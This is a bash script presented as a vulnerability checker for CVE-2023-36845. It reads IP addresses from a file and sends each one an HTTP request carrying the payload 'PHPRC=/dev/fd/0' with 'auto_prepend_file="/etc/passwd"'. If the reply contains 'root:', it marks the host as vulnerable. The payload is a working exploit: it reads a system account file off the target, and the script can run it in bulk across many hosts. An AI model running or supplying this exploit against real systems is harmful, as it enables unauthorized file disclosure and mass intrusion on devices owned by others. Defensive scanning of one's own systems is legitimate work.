#!/bin/bash

RESET="\033[0m"
RED="\033[31m"
GREEN="\033[32m"
BOLD="\033[1m"

banner() {
    echo -e "${BOLD}${RED}
    Vulnerability Checker${RESET}"
    echo
    echo -e "${BOLD} - Script to check for CVE-2023-36845 vulnerability${RESET}"
    echo
    echo -e "${BOLD} Author: Jahit Hoque ${RESET}"
    echo
}

check_vulnerability() {
    local ip=$1
    local url="https://${ip}/about.php?PHPRC=/dev/fd/0"
    local data='auto_prepend_file="/etc/passwd"'
    
    response=$(curl -ksS --data-binary "$data" --max-time 15 "$url")

    if [[ "$response" == *"root:"* ]]; then
        echo -e "$ip --> $RED Vulnerable$RESET"
    elif [ -n "$response" ]; then
        echo -e "$ip --> $GREEN Not vulnerable - $response$RESET"
    else
        echo -e "$ip --> $GREEN Not vulnerable - HTTP Error$RESET"
    fi
}

main() {
    banner
    while getopts ":f:" opt; do
        case $opt in
            f)
                file=$OPTARG
                ;;
            \?)
                echo "Invalid option: -$OPTARG" >&2
                exit 1
                ;;
            :)
                echo "Option -$OPTARG requires an argument." >&2
                exit 1
                ;;
        esac
    done

    if [ -z "$file" ]; then
        echo "Error: File containing IPs is required."
        exit 1
    fi

    while IFS= read -r ip; do
        ip=$(echo "$ip" | tr -d '[:space:]')
        check_vulnerability "$ip"
    done < "$file"
}

main "$@"
